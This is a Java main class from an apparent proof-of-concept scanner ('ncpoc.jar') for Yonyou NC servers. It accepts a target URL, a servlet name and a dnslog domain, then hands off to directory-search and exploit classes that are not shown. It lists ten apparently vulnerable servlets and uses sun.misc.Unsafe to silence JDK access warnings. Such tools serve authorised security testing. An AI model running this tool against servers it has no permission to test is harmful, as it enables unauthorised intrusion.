package test;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Properties;

import nc.bs.framework.common.NCLocator;
import nc.bs.framework.rmi.RemoteContextStub;
import nc.bs.framework.rmi.RemoteInvocationHandler;

public class Main {
	public static String url;
    public static void main(String[] args) throws Exception {
    	
    	
    	disableAccessWarnings();
    	System.out.println("此工具仅能dnslog漏洞测试，不可用于非法用途，有问题请联系sonomon@126.com");
    	if (args.length == 1){
    		String domain =  args[0];
    		if (domain.endsWith("/")){
    			url = domain;
    		} else {
    			url = domain+"/";
    		}
    		System.out.println(url);
    		new Dirsearch(url);
    	} else if (args.length == 3){
    		String domain =  args[0];
    		String servletname =  args[1];
    		String dnslog =  args[2];
    		if (domain.endsWith("/")){
    			url = domain;
    		} else {
    			url = domain+"/";
    		}
    		new Expliot(url, servletname, dnslog);
    		
    	
    	} else {
    		System.out.println("请输入 java -jar ncpoc.jar http://target.com\n"
    				+ "或者 java -jar ncpoc.jar http://target.com Servlet xxx.dnslog.cn\n"
    				+ "目前支持的Servlet如下\n"
    				+ "MonitorServlet\n"
    				+ "MxServlet\n"
    				+ "XbrlPersistenceServlet\n"
    				+ "FileReceiveServlet\n"
    				+ "DownloadServlet\n"
    				+ "UploadServlet\n"
    				+ "DeleteServlet\n"
    				+ "ActionHandlerServlet\n"
    				+ "NCMessageServlet\n"
    				+ "ServiceDispatcherServlet\n"
    				);
		}

    }
    @SuppressWarnings("unchecked")
    public static void disableAccessWarnings() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field field = unsafeClass.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Object unsafe = field.get(null);
 
            Method putObjectVolatile =
                unsafeClass.getDeclaredMethod("putObjectVolatile", Object.class, long.class, Object.class);
            Method staticFieldOffset = unsafeClass.getDeclaredMethod("staticFieldOffset", Field.class);
 
            Class loggerClass = Class.forName("jdk.internal.module.IllegalAccessLogger");
            Field loggerField = loggerClass.getDeclaredField("logger");
            Long offset = (Long)staticFieldOffset.invoke(unsafe, loggerField);
            putObjectVolatile.invoke(unsafe, loggerClass, offset, null);
        } catch (Exception ignored) {
        }
    }
}